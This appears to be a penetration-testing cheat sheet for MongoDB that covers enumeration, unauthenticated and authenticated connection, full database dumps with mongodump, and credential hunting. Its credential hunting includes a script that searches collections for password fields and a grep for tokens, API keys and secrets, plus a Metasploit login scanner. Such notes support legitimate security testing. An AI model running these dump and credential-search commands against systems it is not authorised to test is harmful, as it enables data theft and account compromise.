# MongoDB (27017)

!!! tip "Start here"
    Attempt an unauthenticated connection with `mongosh --host $IP`, then verify what the account can actually list or read. Current MongoDB packages bind to localhost by default; remote exposure indicates an explicit network configuration.

---

## Enumeration

```bash
nmap -p 27017 -sV --script mongodb-info $IP
mongosh --host $IP --eval "db.version()"
```

---

## Unauthenticated Access

```bash
mongosh --host $IP
```

Once connected:

```javascript
show dbs                                      // list databases
use DATABASE_NAME
show collections                              // list collections
db.getCollection("COLLECTION_NAME").find()   // dump a collection
db.getCollection("COLLECTION_NAME").countDocuments({})
db.getUsers()                                 // users in the current database
```

---

## Authenticated Access

```bash
mongosh --host $IP -u "$USERNAME" -p --authenticationDatabase admin
```

---

## Dumping Databases

```bash
mongodump --host $IP --out ./mongo_dump
mongodump --host $IP -d "$DATABASE" -c "$COLLECTION" --out ./mongo_dump
```

Dump with authentication:

```bash
mongodump --host $IP -u "$USERNAME" --authenticationDatabase admin --out ./mongo_dump
```

---

## Credential Hunting in Collections

Application databases frequently store hashed (sometimes cleartext) passwords, API tokens, and session data:

```javascript
// search every collection in every database for password fields
db.getCollectionNames().forEach(function(c) {
  db[c].find({password: {$exists: true}}).forEach(printjson);
});
```

Convert BSON to JSON before searching it offline:

```bash
mongodump --host $IP --out ./mongo_dump
find ./mongo_dump -type f -name '*.bson' -print0 \
  | while IFS= read -r -d '' file; do bsondump "$file"; done \
  | rg -i 'password|token|api[_-]?key|secret'
```

---

## Metasploit Modules

```bash
use auxiliary/scanner/mongodb/mongodb_login
set RHOSTS $IP
run
```
